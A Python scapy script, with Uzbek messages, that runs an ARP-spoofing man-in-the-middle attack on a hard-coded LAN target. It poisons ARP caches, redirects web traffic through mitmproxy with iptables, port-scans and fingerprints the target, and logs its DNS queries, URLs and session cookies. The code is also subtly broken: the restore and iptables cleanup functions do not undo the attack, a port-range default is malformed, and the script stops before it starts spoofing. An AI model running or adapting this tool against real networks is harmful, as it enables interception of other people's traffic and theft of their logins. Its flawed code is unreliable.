from scapy.layers.l2 import ARP, Ether
from scapy.layers.inet import IP, TCP
from scapy.layers.dns import DNS, DNSQR
from scapy.all import sendp, sniff, conf, srp, sr1
import time
import sys
import threading
import os
import subprocess
import datetime
import requests

# Disable warnings
conf.verb = 0
# Network configurations
interface = "wlo1"
gateway_ip = "10.30.0.1"
target_ip = "10.30.9.15"
attacker_mac = "###"
mitmproxy_port = 8080


# log datas to a file
def log_to_file(message):
    with open("traffic_log.txt", "a") as f:
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        f.write(f"{timestamp}: {message}\n")


# Function to perform ARP spoofing
def spoof(target_ip, spoof_ip, target_mac):
    ether = Ether(dst=target_mac, src=attacker_mac)
    arp = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=attacker_mac)
    packet = ether / arp
    sendp(packet, iface=interface)
    msg = f"Spoofing: {target_ip} <- {spoof_ip}"
    print(msg)
    log_to_file(msg)


# Function to restore ARP table
def restore(target_ip, spoof_ip, target_mac, spoof_mac):
    ether = Ether(dst=target_mac, src=attacker_mac)
    arp = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=attacker_mac)
    packet = ether / arp
    sendp(packet, count=4, iface=interface)
    msg = f"Restoring: {target_ip} -> {spoof_ip}"
    print(msg)
    log_to_file(msg)


# Function to get target and gateway MAC addresses
def get_mac(ip):
    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    result = srp(arp_request, timeout=2, iface=interface)[0]
    return result[0][1].hwsrc if result else None


# Continue the ARP spoofing attack
def start_spoofing(target_mac, gateway_mac):
    try:
        while True:
            spoof(target_ip, gateway_ip, target_mac)
            spoof(gateway_ip, target_ip, gateway_mac)
            time.sleep(2)
    except Exception as e:
        msg = f"Spoofing error: {e}"


# Start mitmproxy as subprocess
def start_mitmproxy():
    msg = f"mitmproxy starting on port {mitmproxy_port}"
    print(msg)
    log_to_file(msg)
    mitmproxy_process = subprocess.Popen(
        ["mitmproxy", "--mode", "transparent", "--listen_port", str(mitmproxy_port)],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )
    time.sleep(2)
    return mitmproxy_process


# Configure iptables to redirect traffic to mitmproxy
def setup_iptables():
    msg = "Setting up iptables"
    print(msg)
    log_to_file(msg)
    os.system("sysctl -w net.ipv4.ip_forward=1")
    os.system(f"iptables -t nat -A PREROUTING -i {interface} -p tcp --dport 80 -j REDIRECT --to-ports {mitmproxy_port}")
    os.system(
        f"iptables -t nat -A PREROUTING -i {interface} -p tcp --dport 443 -j REDIRECT --to-ports {mitmproxy_port}")


# Clean iptables
def clean_iptables():
    msg = "Cleaning up iptables"
    print(msg)
    log_to_file(msg)
    os.system(f"iptables -t nat -A PREROUTING -i {interface} -p tcp --dport 80 -j REDIRECT --to-ports {mitmproxy_port}")
    os.system(
        f"iptables -t nat -A PREROUTING -i {interface} -p tcp --dport 443 -j REDIRECT --to-ports {mitmproxy_port}")
    os.system("sysctl -w net.ipv4.ip_forward=0")


# OS Fingerprinting
def os_fingerprint(target_ip):
    msg = f"OS fingerprinting {target_ip}"
    print(msg)
    log_to_file(msg)
    packet = IP(dst=target_ip) / TCP(dport=80, flags="S")
    response = sr1(packet, timeout=2, verbose=0)
    if response:
        ttl = response[IP].ttl
        window_size = response[TCP].window
        if ttl <= 64:
            os_type = "Linux/Unix & Android"
        elif ttl <= 128:
            os_type = "Windows"
        elif ttl <= 255:
            os_type = "iOS/MacOS or etc."
        else:
            os_type = "Unknown"
        msg = f"Possible OS: {os_type}, TTL: {ttl}, Window Size: {window_size}"
    else:
        msg = "No response for OS fingerprinting"
    print(msg)
    log_to_file(msg)


# Scanning for open ports
def scan_ports(target_ip, port_range=(1.100)):
    msg = f"Portlarni skanerlash: {target_ip}"
    print(msg)
    log_to_file(msg)
    open_ports = []
    for port in range(port_range[0], port_range[1] + 1):
        pkt = IP(dst=target_ip) / TCP(dport=port, flags="S")
        resp = sr1(pkt, timeout=1, verbose=0)
        if resp and resp.haslayer(TCP) and resp[TCP].flags == 0x12:
            open_ports.append(port)
            sr1(IP(dst=target_ip) / TCP(dport=port, flags="R"), timeout=1, verbose=0)
    msg = f"Ochiq portlar {open_ports}"
    print(msg)
    log_to_file(msg)


def sniff_dns():
    msg = "DNS so'rovlarini ushlash boshlandi..."
    print(msg)
    log_to_file(msg)

    def process_dns(packet):
        if packet.haslayer(DNS) and packet[DNS].qr == 0:
            dns_query = packet[DNSQR].qname.decode("utf-8", errors="ignore")
            msg = f"DNS so'rov: {dns_query}"
            print(msg)
            log_to_file(msg)

    sniff(iface=interface, filter=f"udp port 53 and host {target_ip}", prn=process_dns, store=0)


# **********************

def get_vendor(mac):
    url = f"https://api.macvendors.com/{mac}"
    try:
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            return response.text
        else:
            return "Vendor aniqlanmadi"
    except:
        return "Internet ulansish xatosi"


def sniff_traffic():
    msg = "Trafikni ushlash boshlandi..."
    print(msg)
    log_to_file(msg)

    def process_packet(packet):
        summary = packet.summary()
        print(summary)
        log_to_file(summary)

        if packet.haslayer("IP"):
            src_ip = packet["IP"].src
            dst_ip = packet["IP"].dst
            if packet.haslayer("TCP"):
                src_port = packet["TCP"].sport
                dst_port = packet["TCP"].dport
                msg = f"Portlar: {src_ip}:{src_port} -> {dst_ip}:{dst_port}"
                print(msg)
                log_to_file(msg)
            if packet.haslayer("Raw"):
                payload = packet("Raw").load
                try:
                    decoded = payload.decode("utf-8", errors="ignore")
                    if "HTTP" in decoded:
                        lines = decoded.split("\r\n")
                        url = None
                        headers = {}
                        for line in lines:
                            if line.startswith("GET") or line.startswith("POST"):
                                parts = line.split(" ")
                                if len(parts) > 1:
                                    url = parts[1]
                            elif ": " in line:
                                key, value = line.split(": ", 1)
                                headers[key] = value
                        if url:
                            msg = f"URL: {url}"
                            print(msg)
                            log_to_file(msg)

                        if headers:
                            for key, value in headers.items():
                                if key in ["Host", "User-Agent", "Cookie", "Referer", "Content-Type"]:
                                    msg = f"{key}:{value}"
                                    print(msg)
                                    log_to_file(msg)
                        msg = f"HTTP ma'lumot : {decoded}"
                        print(msg)
                        log_to_file(msg)
                    else:
                        msg = f"Shifrlangan yoki boshqa ma'lumot: {payload.hex()}"
                        print(msg)
                        log_to_file(msg)
                except:
                    msg = f"Dekod qilib  bo'lmadi: {payload.hex()}"
                    print(msg)
                    log_to_file(msg)

    sniff(iface=interface, filter=f"host {target_ip}", prn=process_packet, store=0)


def main():
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)


    if not target_mac or not gateway_mac:
        msg = "MAC manzillarni olishda xato! IP'lar to'g'ri ekanligini tekshiring."
        print(msg)
        log_to_file(msg)
        sys.exit(1)

    msg = f"Target MAC: {target_mac}"
    print(msg)
    log_to_file(msg)

    msg = f"Gateway MAC: {gateway_mac}"
    print(msg)
    log_to_file(msg)

    # Start sniffing in a separate thread
    vendor = get_vendor(target_mac)
    msg = f"Qurilma ishlab chiqaruvchisi: {vendor}"
    print(msg)
    log_to_file(msg)
    os_fingerprint(target_ip)
    scan_ports(target_ip, (1, 100))

    start_mitmproxy()
    setup_iptables()
